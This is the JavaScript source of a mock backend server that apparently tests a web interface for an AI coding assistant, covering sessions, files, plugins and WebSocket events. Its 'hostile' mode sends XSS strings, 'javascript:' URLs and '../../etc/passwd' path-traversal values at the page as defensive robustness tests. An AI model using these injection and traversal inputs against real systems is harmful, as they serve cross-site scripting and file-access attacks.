}
async function question(s) {
  const input = { questions: [{ question: 'Which retry policy should get() use?', header: 'Policy', multiSelect: false, options: [{ label: 'Default (3 attempts)', description: 'DEFAULT_POLICY' }, { label: 'Aggressive (5 attempts)', description: 'more retries, longer waits' }] }] };
  const r = await askQuestions(s, input);
  if (r) await s.stream(`Got it — ${r[0]}.`);
  return 2;
}
async function questions(s) {
  const input = { questions: [
    { question: 'Which HTTP methods should retry?', header: 'Methods', multiSelect: true, options: [{ label: 'GET', description: 'safe to repeat' }, { label: 'PUT', description: 'idempotent' }, { label: 'POST', description: 'only with an idempotency key' }] },
    { question: 'Where should the policy live?', header: 'Config', multiSelect: false, options: [{ label: 'In the client options' }, { label: 'In a config file' }] },
  ] };
  const r = await askQuestions(s, input);
  if (r) await s.stream(`Got it — retry ${r[0]}; the policy goes: ${r[1]}.`);
  return 2;
}

async function hostile(s) {
  const h = HOSTILE;
  s.hostileTurn = true;
  s.init();
  await s.stream(hostileMarkdown(), { chunk: [200, 400], delay: [1, 3] });
  s.emit({ type: 'thinking', text: h.script + h.bidi });
  const id = 'toolu_' + crypto.randomBytes(10).toString('hex');
  s.emit({ type: 'tool_use', id, name: h.img, input: { [h.svg]: h.script, deep: JSON.parse('{"a":'.repeat(30) + '1' + '}'.repeat(30)), huge: h.giant } });
  s.emit({ type: 'tool_result', id, text: h.giant + h.controls, is_error: false });
  const b = 'toolu_' + crypto.randomBytes(10).toString('hex');
  s.emit({ type: 'tool_use', id: b, name: 'Bash', input: { command: `echo "${h.bidi}" ${h.img}`, description: h.svg } });
  s.emit({ type: 'tool_result', id: b, text: `${h.controls}\n${h.script}\n${h.zeroWidth}`, is_error: true });
  const e = 'toolu_' + crypto.randomBytes(10).toString('hex');
  s.emit({ type: 'tool_use', id: e, name: 'Edit', input: { file_path: `/workspace/${h.img}`, old_string: h.script, new_string: h.svg } });
  s.emit({ type: 'tool_result', id: e, text: 'ok', edit: { path: '../../etc/passwd', original: h.script, hunks: [{ oldStart: -5, oldLines: 'x', newStart: 1, newLines: 1, lines: ['-' + h.script, '+' + h.svg, 42] }] } });
  // invalid ids and shapes: dropped by the page
  s.emit({ type: 'tool_use', id: '../../etc', name: 'Bash', input: {} });
  s.emit({ type: 'tool_result', id: '<img src=x onerror=alert(1)>', text: 'bad id' });
  s.emit({ type: h.img, text: 'unknown event type' });
  s.emit({ type: 'local', text: h.style + '\n\n' + h.jsLink });
  s.emit({ type: 'task', id: 'task_1', status: h.img, summary: h.script });
  s.emit({ type: 'status', status: h.svg, permissionMode: 'bypassPermissions', model: h.img });
  // raw non-event garbage on the socket
  s.broadcast({ type: 'event', session: '../../etc', seq: 1e9, ev: { type: 'text', text: 'wrong session' } });
  s.broadcast({ type: 'permission_done', id: h.img });
  for (const ws of s.sockets) ws.readyState === 1 && ws.send('not json <script>alert(1)</script>');
  const a = await s.ask(h.img, { command: h.script, [h.svg]: h.bidi, url: 'javascript:alert(1)' }, [{ type: 'addRules', rules: [{ toolName: h.img, ruleContent: h.script }], behavior: 'allow', destination: h.svg }], h.iframe);
  s.emit({ type: 'text', text: `Permission answer: ${a.decision}` });
  return 1;
}

// ------------------------------------------------------------------ HTTP

const CT = { '.html': 'text/html; charset=utf-8', '.js': 'text/javascript; charset=utf-8', '.css': 'text/css; charset=utf-8', '.txt': 'text/plain; charset=utf-8', '.map': 'application/json', '.svg': 'image/svg+xml' };

function csp(req) {
  const host = req.headers.host || `${HOST}:${PORT}`;
  return [
    "default-src 'none'",
    "script-src 'self'",
    "style-src 'self'",
    `connect-src 'self' ws://${host} wss://${host}`,
    "img-src 'self' data: blob:",
    "font-src 'self'",
    "worker-src 'self'",
    "base-uri 'none'",
    "form-action 'none'",
    "object-src 'none'",
    "frame-src 'self'",
    "frame-ancestors 'self'",
    "require-trusted-types-for 'script'",
    "trusted-types 'none'",
  ].join('; ');
}

const json = (res, code, body) => {
  res.writeHead(code, { 'content-type': 'application/json', 'cache-control': 'no-store' });
  res.end(JSON.stringify(body));
};
const body = (req, max = 30 * 1024 * 1024) =>
  new Promise((resolve, reject) => {
    const chunks = [];
    let n = 0;
    req.on('data', (c) => {
      n += c.length;
      if (n > max) {
        reject(new Error('too large'));
        req.destroy();
      } else chunks.push(c);
    });
    req.on('end', () => resolve(Buffer.concat(chunks)));
    req.on('error', reject);
  });
const jsonBody = async (req) => {
  try {
    return JSON.parse((await body(req, 5 * 1024 * 1024)).toString() || '{}');
  } catch {
    return {};
  }
};
const UUID = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/;

function sessionInfo(x) {
  return { id: x.id, title: x.title, first_prompt: x.firstPrompt, branch: x.branch, modified: x.modified };
}

async function api(req, res, url) {
  const p = url.pathname;
  const m = req.method;
  if (p === '/api/state') {
    return json(res, 200, {
      versions: { cli: '2.1.296', sdk: '0.3.296' },
      limits: { sessions: 4, upload: 25 * 1024 * 1024, image: 5 * 1024 * 1024 },
      sessions: [...sessions.values()].map((s) => ({ id: s.id, state: s.state, model: s.model, mode: s.mode, title: s.title, pending: s.pending.size })),
      terminal_url: `http://${req.headers.host}/__terminal`,
    });
  }
  if (p === '/api/sessions' && m === 'GET') {
    const q = (url.searchParams.get('q') || '').toLowerCase();
    const rows = [...saved.values()].filter((x) => !q || `${x.title} ${x.firstPrompt}`.toLowerCase().includes(q)).sort((a, b) => b.modified - a.modified);
    return json(res, 200, { sessions: rows.map(sessionInfo) });
  }
  if (p === '/api/sessions' && m === 'POST') {
    const b = await jsonBody(req);
    await sleep(250);   // (as a real start takes a moment: a prompt typed meanwhile must still reach the new session)
    let id = crypto.randomUUID();
    let title = '';
    if (b.resume && UUID.test(b.resume) && !b.fork) {
      // the backend never opens a second process on one transcript: an open session is simply returned
      if (sessions.has(b.resume)) return json(res, 200, { id: b.resume, existing: true });
      id = b.resume;
      title = saved.get(b.resume)?.title ?? '';
    }
    if (sessions.size >= 4) return json(res, 409, { error: '4 sessions are working or waiting for you: stop or close one first' });
    const s = new Session({ id, model: b.model, mode: b.mode, effort: b.effort, title });
    if (b.fork && saved.get(b.resume)) s.transcript = saved.get(b.resume).transcript.slice();
    sessions.set(id, s);
    log('open', id, b.resume ? (b.fork ? 'fork of ' + b.resume : 'resume') : 'new', s.model, s.mode);
    return json(res, 200, { id, existing: false });
  }
  let mm = /^\/api\/sessions\/([^/]+)(\/messages|\/title)?$/.exec(p);
  if (mm) {
    const id = mm[1];
    if (!UUID.test(id)) return json(res, 400, { error: 'bad id' });
    if (mm[2] === '/messages') {
      const t = sessions.get(id)?.transcript ?? saved.get(id)?.transcript;
      if (!t) return json(res, 404, { error: 'no such session' });
      const offset = Number(url.searchParams.get('offset') || 0);
      const limit = Number(url.searchParams.get('limit') || 400);
      return json(res, 200, { messages: t.slice(offset, offset + limit), total: t.length, offset });
    }
    if (mm[2] === '/title' && m === 'POST') {
      const b = await jsonBody(req);
      const title = String(b.title || '').slice(0, 200);
      if (sessions.get(id)) sessions.get(id).title = title;
      if (saved.get(id)) saved.get(id).title = title;
      return json(res, 200, { ok: true });
    }
    if (!mm[2] && m === 'DELETE') {
      const s = sessions.get(id);
      if (s) {
        s.interrupt();
        s.setState('closed');
        sessions.delete(id);
      }
      return json(res, 200, { ok: true });
    }
  }
  if (p === '/api/fs' && m === 'GET') {
    const d = clean(url.searchParams.get('path') || '');
    if (d === null) return json(res, 400, { error: 'not in the workspace' });
    if (d && !dirs().has(d) && !extraDirs.has(d)) return json(res, 404, { error: 'no such folder' });
    const entries = list(d);
    if (HOSTILE_MODE && d === '') entries.push({ name: '../escape', type: 'dir', size: 0, mtimeMs: 1 }, { name: HOSTILE.img, type: 'weird', size: -5, mtimeMs: 'NaN' });
    return json(res, 200, { path: d || '.', entries });
  }
  if (p === '/api/fs' && m === 'DELETE') {
    const d = clean(url.searchParams.get('path') || '');
    if (!d) return json(res, 400, { error: 'bad path' });
    let n = 0;
    for (const k of [...fsState.keys()]) if (k === d || k.startsWith(d + '/')) (fsState.delete(k), n++);
    extraDirs.delete(d);
    return n ? json(res, 200, { ok: true }) : json(res, 404, { error: 'not found' });
  }
  if (p === '/api/fs/file' && m === 'GET') {
    const f = clean(url.searchParams.get('path') || '');
    const e = f && fsState.get(f);
    if (!e) return json(res, 404, { error: 'no such file' });
    if (url.searchParams.get('download')) {
      res.writeHead(200, { 'content-type': 'application/octet-stream', 'content-disposition': `attachment; filename="${path.basename(f).replace(/[^\w.-]/g, '_')}"`, 'cache-control': 'no-store' });
      return res.end(e.data);
    }
    const MAX = 2 << 20;
    const truncated = e.data.length > MAX;
    const data = e.data.subarray(0, MAX);
    const binary = e.bin || data.subarray(0, 8192).includes(0);
    await sleep(60);
    return json(res, 200, { size: e.data.length, mtimeMs: e.mtimeMs, truncated, binary, text: binary ? null : data.toString('utf8') });
  }
  if (p === '/api/fs/file' && m === 'PUT') {
    const f = clean(url.searchParams.get('path') || '');
    if (!f) return json(res, 400, { error: 'bad path' });
    const b = await jsonBody(req);
    const cur = fsState.get(f);
    if (b.ifMtimeMs !== undefined && b.ifMtimeMs !== null && cur && cur.mtimeMs !== b.ifMtimeMs) return json(res, 409, { error: 'changed on disk since it was opened', mtimeMs: cur.mtimeMs });
    writeFile(f, String(b.text ?? ''));
    return json(res, 200, { ok: true, mtimeMs: fsState.get(f).mtimeMs });
  }
  if (p === '/api/fs/upload' && m === 'POST') {
    const d = clean(url.searchParams.get('dir') || '');
    let name = '';
    try {
      name = decodeURIComponent(String(req.headers['x-filename'] || ''));
    } catch {
      /* bad encoding */
    }
    if (d === null || !name || name.includes('/') || name === '..') return json(res, 400, { error: 'bad name' });
    const data = await body(req, 25 * 1024 * 1024).catch(() => null);
    if (!data) return json(res, 413, { error: 'too large' });
    const f = d ? `${d}/${name}` : name;
    fsState.set(f, { data, mtimeMs: Date.now(), bin: data.subarray(0, 8192).includes(0) });
    return json(res, 200, { path: f, size: data.length });
  }
  if (p === '/api/fs/mkdir' && m === 'POST') {
    const d = clean((await jsonBody(req)).path);
    if (!d) return json(res, 400, { error: 'bad path' });
    extraDirs.add(d);
    return json(res, 200, { ok: true });
  }
  if (p === '/api/fs/rename' && m === 'POST') {
    const b = await jsonBody(req);
    const from = clean(b.from);
    const to = clean(b.to);
    if (!from || !to) return json(res, 400, { error: 'bad path' });
    let n = 0;
    for (const [k, v] of [...fsState]) {
      if (k === from || k.startsWith(from + '/')) {
        fsState.delete(k);
        fsState.set(to + k.slice(from.length), v);
        n++;
      }
    }
    return n ? json(res, 200, { ok: true }) : json(res, 404, { error: 'not found' });
  }
  if (p === '/api/plugins' && m === 'GET') {
    const inst = plug.installed.map((i) => ({ id: i.id, name: i.id.split('@')[0], marketplace: i.id.split('@')[1], version: i.version, scope: i.scope, enabled: i.enabled, fromFolder: false, errors: [] }));
    if (HOSTILE_MODE) inst.push({ id: '../../etc', name: HOSTILE.img }, { id: 'ok@m', name: HOSTILE.script, marketplace: HOSTILE.svg, version: HOSTILE.bidi, scope: HOSTILE.img, enabled: 'yes', errors: [HOSTILE.iframe] });
    return json(res, 200, { installed: inst, marketplaces: plug.marketplaces });
  }
  if (p === '/api/plugins/available' && m === 'GET') {
    const q = (url.searchParams.get('q') || '').toLowerCase();
    const mk = url.searchParams.get('marketplace') || '';
    const all = catalog();
    const hits = all.filter((x) => (!mk || x.marketplace === mk) && (!q || `${x.name} ${x.description} ${x.marketplace}`.toLowerCase().includes(q)));
    const limit = Math.min(500, Number(url.searchParams.get('limit')) || 100);
    const counts = {};
    for (const x of all) counts[x.marketplace] = (counts[x.marketplace] || 0) + 1;
    await sleep(120);
    return json(res, 200, {
      plugins: hits.slice(0, limit).map((x) => ({ id: x.id, name: x.name, marketplace: x.marketplace, description: x.description, version: x.version, kind: x.kind, ...(x.command ? { command: x.command } : {}), installed: plug.installed.some((i) => i.id === x.id) })),
      total: hits.length, offset: 0, limit, more: hits.length > limit, marketplaces: Object.entries(counts).map(([name, count]) => ({ name, count })),
    });
  }
  mm = /^\/api\/plugins\/(install|update|uninstall|enable|disable)$/.exec(p);
  if (mm && m === 'POST') {
    const b = await jsonBody(req);
    const act = mm[1];
    const NAME = /^[A-Za-z0-9][A-Za-z0-9._-]{0,99}(@[A-Za-z0-9][A-Za-z0-9._-]{0,99})?$/;
    if (typeof b.name !== 'string' || !NAME.test(b.name)) return json(res, 400, { error: 'bad plugin name' });
    if (b.acceptCommand !== undefined && !/^[0-9a-f]{64}$/.test(b.acceptCommand)) return json(res, 400, { error: 'bad acceptCommand (a SHA-256)' });
    await sleep(300);
    const cur = plug.installed.find((i) => i.id === b.name);
    const fail = (message, failureCode = 'error_unknown') => json(res, 200, { ok: false, outcome: 'failed', message, failureCode });
    const ok = (message) => json(res, 200, { ok: true, outcome: 'ok', message, failureCode: null, reloaded: reloadAll() });
    if (act === 'install') {
      const entry = catalog().find((x) => x.id === b.name || (!b.name.includes('@') && x.name === b.name));
      if (!entry) return fail(`Plugin "${b.name}" not found in any marketplace`, 'not_found');
      if (cur) return fail(`Plugin "${b.name}" is already installed`, 'already_in_goal_state');
      if (entry.kind === 'command') {
        const c = confirmationOf(entry);
        if (b.acceptCommand !== c.sha256) {
          return json(res, 200, { ok: false, outcome: 'failed', failureCode: 'command_source_refused',
            message: `${entry.id} is installed by running a command on this machine (\`${entry.command}\`) that has not been reviewed yet, so it was not run.`,
            needs_confirmation: { kind: c.kind, plugin: entry.id, command: c.command, sha256: c.sha256, mode: c.mode, archiveUrl: null, matched: b.acceptCommand !== undefined } });
        }
      }
      plug.installed.push({ id: entry.id, version: entry.version, scope: 'user', enabled: true });
      return ok(`Successfully installed plugin: ${entry.id} (scope: user)`);
    }
    if (!cur) return fail(`Plugin "${b.name}" not found in installed plugins`, 'not_installed');
    if (act === 'uninstall') { plug.installed = plug.installed.filter((i) => i !== cur); return ok(`Successfully uninstalled plugin: ${cur.id}`); }
    if (act === 'enable' || act === 'disable') {
      if (cur.enabled === (act === 'enable')) return fail(`Plugin "${cur.id}" is already ${act}d`, 'already_in_goal_state');
      cur.enabled = act === 'enable';
      return ok(`Successfully ${act}d plugin: ${cur.id.split('@')[0]} (scope: user)`);
    }
    return ok(`${cur.id.split('@')[0]} is already at the latest version (${cur.version}).`);
  }
  if (p === '/api/marketplaces' && m === 'GET') return json(res, 200, { marketplaces: plug.marketplaces });
  if (p === '/api/marketplaces' && m === 'POST') {
    const src = String((await jsonBody(req)).source || '').trim();
    await sleep(400);
    const name = /^[\w.-]+\/[\w.-]+$/.test(src) ? src.split('/')[1] : /^https:\/\//.test(src) ? src.replace(/\.git$/, '').split('/').pop() : src.startsWith('/workspace/') ? src.split('/').filter(Boolean).pop() : '';
    if (!name || !/^[A-Za-z0-9][A-Za-z0-9._-]{0,99}$/.test(name)) return json(res, 200, { ok: false, outcome: 'failed', message: `Invalid marketplace source: ${src}`, failureCode: 'invalid_source' });
    if (plug.marketplaces.some((x) => x.name === name)) return json(res, 200, { ok: false, outcome: 'failed', message: `Marketplace '${name}' is already added`, failureCode: 'already_added' });
    plug.marketplaces.push({ name, source: src.startsWith('/') ? 'directory' : src.startsWith('https') ? 'git' : 'github', location: src });
    return json(res, 200, { ok: true, outcome: 'ok', message: `Successfully added marketplace: ${name} (declared in user settings)`, reloaded: reloadAll() });
  }
  if (p === '/api/marketplaces/update' && m === 'POST') {
    const name = String((await jsonBody(req)).name || '');
    return json(res, 200, plug.marketplaces.some((x) => x.name === name) ? { ok: true, outcome: 'ok', message: `Successfully updated marketplace: ${name}`, reloaded: reloadAll() } : { ok: false, outcome: 'failed', message: `Marketplace '${name}' not found` });
  }
  if (p === '/api/marketplaces' && m === 'DELETE') {
    const name = url.searchParams.get('name') || '';
    if (!plug.marketplaces.some((x) => x.name === name)) return json(res, 200, { ok: false, outcome: 'failed', message: `Marketplace '${name}' not found` });
    plug.marketplaces = plug.marketplaces.filter((x) => x.name !== name);
    const gone = plug.installed.filter((i) => i.id.endsWith(`@${name}`));
    plug.installed = plug.installed.filter((i) => !gone.includes(i));
    return json(res, 200, { ok: true, outcome: 'ok', message: `Successfully removed marketplace: ${name}${gone.length ? `\nAlso uninstalled ${gone.length} plugin(s).` : ''}`, reloaded: reloadAll() });
  }
  if (p === '/api/mcp' && m === 'POST') {
    const b = await jsonBody(req);
    if (typeof b.name !== 'string' || !/^(?!bedrock-shared$)[A-Za-z0-9][A-Za-z0-9_-]{0,63}$/.test(b.name)) return json(res, 400, { error: 'a name of letters, digits, - and _ (not bedrock-shared)' });
    if (b.transport === 'stdio' ? !(typeof b.command === 'string' && b.command.trim()) : !['http', 'sse'].includes(b.transport) || !/^https?:\/\//.test(b.url || '')) return json(res, 400, { error: 'bad server' });
    if (plug.mcp.some((x) => x.name === b.name)) return json(res, 200, { ok: false, outcome: 'failed', message: `MCP server ${b.name} already exists in user config` });
    plug.mcp.push({ name: b.name, config: b.transport === 'stdio' ? { type: 'stdio', command: b.command, args: b.args ?? [], env: b.env ?? {} } : { type: b.transport, url: b.url, headers: b.headers ?? {} } });
    return json(res, 200, { ok: true, outcome: 'ok', message: `Added ${b.transport} MCP server ${b.name} to user config` });
  }
  if (p === '/api/mcp' && m === 'DELETE') {
    const name = url.searchParams.get('name') || '';
    if (!plug.mcp.some((x) => x.name === name)) return json(res, 200, { ok: false, outcome: 'failed', message: `No user-scoped MCP server found with name: ${name}` });
    plug.mcp = plug.mcp.filter((x) => x.name !== name);
    return json(res, 200, { ok: true, outcome: 'ok', message: `Removed MCP server ${name} from user config` });
  }
  return json(res, 404, { error: 'not found' });
}

function bn(req, res, url) {
  if (url.pathname === '/.bn/models') {
    if (!HOSTILE_MODE) return json(res, 200, MODELS);
    return json(res, 200, { ...MODELS, models: [...MODELS.models, { id: HOSTILE.img, name: HOSTILE.script, input_per_mtok: -1, output_per_mtok: 'NaN' }] });
  }
  if (url.pathname === '/.bn/spend') {
    const id = url.searchParams.get('session') || '';
    return json(res, 200, { rows: spendRows.get(id) ?? [] });
  }
  return json(res, 404, { error: 'not found' });
}

const TERMINAL_HTML = `<!doctype html><html><head><meta charset="utf-8"><link rel="stylesheet" href="/__terminal.css"><title>terminal (mock)</title></head>
<body><pre>bedrock-now terminal (mock: ttyd + tmux live here)

coder@sandbox:/workspace$ claude --resume
coder@sandbox:/workspace$ npm test

 Test Files  1 passed (1)
      Tests  1 passed (1)

coder@sandbox:/workspace$ <span class="cur"> </span></pre></body></html>`;
const TERMINAL_CSS = 'html,body{margin:0;height:100%;background:#111820;color:#d7dee5}pre{margin:0;padding:10px 12px;font:12.5px/1.45 ui-monospace,Menlo,monospace}.cur{background:#73b6cd}';

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, 'http://mock');
  try {
    if (url.pathname.startsWith('/api/')) return await api(req, res, url);
    if (url.pathname.startsWith('/.bn/')) return bn(req, res, url);
    if (url.pathname === '/__terminal') {
      res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'content-security-policy': "default-src 'none'; style-src 'self'; frame-ancestors 'self'" });
      return res.end(TERMINAL_HTML);
    }
    if (url.pathname === '/__terminal.css') {
      res.writeHead(200, { 'content-type': 'text/css' });
      return res.end(TERMINAL_CSS);
    }
    if (url.pathname.startsWith('/__mock/') && req.method === 'POST') {
      if (url.pathname === '/__mock/drop') {
        for (const ws of wss.clients) ws.terminate();
        return json(res, 200, { ok: true });
      }
      if (url.pathname === '/__mock/touch') {
        const f = clean(url.searchParams.get('path') || '');
        const e = f && fsState.get(f);
        if (!e) return json(res, 404, { error: 'no such file' });
        writeFile(f, e.data.toString() + '\n// changed on disk by someone else\n');
        return json(res, 200, { ok: true });
      }
      if (url.pathname === '/__mock/reset') {
        resetFs();
        resetPlugins();
        for (const s of sessions.values()) s.interrupt();
        sessions.clear();
        spendRows.clear();
        saved.clear();
        seedSaved();
        return json(res, 200, { ok: true });
      }
    }
    // static
    let rel = url.pathname === '/' ? 'index.html' : decodeURIComponent(url.pathname.slice(1));
    const file = path.normalize(path.join(DIST, rel));
    if (!file.startsWith(DIST + path.sep) || !fs.existsSync(file) || !fs.statSync(file).isFile()) {
      res.writeHead(404, { 'content-type': 'text/plain' });
      return res.end('not found');
    }
    res.writeHead(200, {
      'content-type': CT[path.extname(file)] ?? 'application/octet-stream',
      'cache-control': rel === 'index.html' ? 'no-store' : 'public, max-age=31536000, immutable',
      'x-content-type-options': 'nosniff',
      'referrer-policy': 'same-origin',
      'content-security-policy': csp(req),
    });
    fs.createReadStream(file).pipe(res);
  } catch (e) {
    json(res, 500, { error: String(e?.message || e) });
  }
});

const wss = new WebSocketServer({ noServer: true, maxPayload: 16 * 1024 * 1024 });
server.on('upgrade', (req, sock, head) => {
  const url = new URL(req.url, 'http://mock');
  const origin = req.headers.origin;
  if (url.pathname !== '/ws' || (origin && new URL(origin).host !== req.headers.host)) {
    sock.write('HTTP/1.1 403 Forbidden\r\n\r\n');
    return sock.destroy();
  }
  wss.handleUpgrade(req, sock, head, (ws) => {
    const mine = new Set();
    ws.on('message', async (raw) => {
      let m;
      try {
        m = JSON.parse(raw.toString());
      } catch {
        return;
      }
      const s = sessions.get(m.session);
      const reply = (x) => ws.readyState === 1 && ws.send(JSON.stringify(x));
      if (m.type === 'permission') {
        for (const x of sessions.values()) {
          const p = x.pending.get(m.id);
          if (!p) continue;
          // "answer" is for AskUserQuestion only, with answers to its own questions (as the backend checks)
          if (m.decision === 'answer') {
            const qs = (p.msg.input?.questions ?? []).map((q) => q.question);
            const a = m.answers && typeof m.answers === 'object' ? m.answers : {};
            if (p.msg.tool !== 'AskUserQuestion' || !qs.length || !qs.every((q) => typeof a[q] === 'string')) {
              return reply({ type: 'error', session: x.id, message: 'that question is no longer waiting, or the answers do not match it' });
            }
          }
          p.done({ decision: m.decision, message: m.message, answers: m.answers });
        }
        return;
      }
      if (!s) return reply({ type: 'error', session: UUID.test(m.session || '') ? m.session : undefined, message: 'No such open session.' });
      switch (m.type) {
        case 'attach': {
          s.sockets.add(ws);
          mine.add(s);
          const since = Number(m.since) || 0;
          const first = s.ring.length ? s.ring[0].seq : s.seq + 1;
          reply({ type: 'attached', session: s.id, state: s.state, from: first, last: s.seq, gap: since + 1 < first && s.seq > since });
          for (const msg of s.ring) if (msg.seq > since) ws.send(JSON.stringify(msg));
          for (const p of s.pending.values()) ws.send(JSON.stringify(p.msg));
          reply({ type: 'session_state', session: s.id, state: s.state });
          log('attach', s.id.slice(0, 8), 'since', since, '→ replayed', s.ring.filter((x) => x.seq > since).length);
          return;
        }
        case 'prompt':
          return void s.prompt({ text: String(m.text ?? '').slice(0, 200_000), images: Array.isArray(m.images) ? m.images : [], uuid: m.uuid });
        case 'interrupt':
          return s.interrupt();
        case 'set_model':
          s.model = String(m.model || '').slice(0, 128);
          return;
        case 'set_mode':
          s.mode = m.mode;
          return s.emit({ type: 'status', permissionMode: m.mode }, { record: false });
        case 'set_effort':
          s.effort = m.effort;
          return;
        case 'commands':
          return reply({ type: 'commands', session: s.id, commands: allCommands() });
        case 'models':
          return reply({ type: 'models', session: s.id, models: CLI_MODELS });
        case 'mcp':
          return reply({ type: 'mcp', session: s.id, servers: mcpServers(s) });
        case 'mcp_reconnect':
        case 'mcp_toggle': {
          const name = String(m.server ?? '');
          if (!mcpServers(s).some((x) => x.name === name)) return reply({ type: 'error', session: s.id, message: `MCP server not found: ${name.slice(0, 80)}` });
          if (m.type === 'mcp_toggle') {
            if (m.enabled === false) s.mcpOff.add(name);
            else s.mcpOff.delete(name);
          }
          await sleep(300);
          return reply({ type: 'mcp', session: s.id, servers: mcpServers(s) });
        }
        case 'context':
          return reply({ type: 'context', session: s.id, usage: { totalTokens: 26_000 + s.turns * 4_100, maxTokens: 200_000, categories: [{ name: 'System prompt', tokens: 3100 }, { name: 'System tools', tokens: 14800 }, { name: 'Messages', tokens: 8100 + s.turns * 4100 }] } });
        case 'stop_task': {
          const t = s.tasks.get(m.task);
          if (t) {
            clearTimeout(t);
            s.tasks.delete(m.task);
            s.emit({ type: 'task', id: m.task, status: 'stopped', summary: 'npm run dev' });
          }
          return;
        }
        case 'reload_plugins':
          await sleep(150);
          reply({ type: 'commands', session: s.id, commands: allCommands() });
          return reply({ type: 'plugins', session: s.id, plugins: plug.installed.filter((i) => i.enabled).map((i) => ({ name: i.id.split('@')[0], version: i.version, source: i.id })) });
      }
    });
    ws.on('close', () => {
      for (const s of mine) s.sockets.delete(ws);
    });
  });
});

server.listen(PORT, HOST, () => log(`mock Code backend on http://${HOST}:${PORT}${HOSTILE_MODE ? ' (hostile)' : ''}${FAST ? ' (fast)' : ''} serving ${DIST}`));
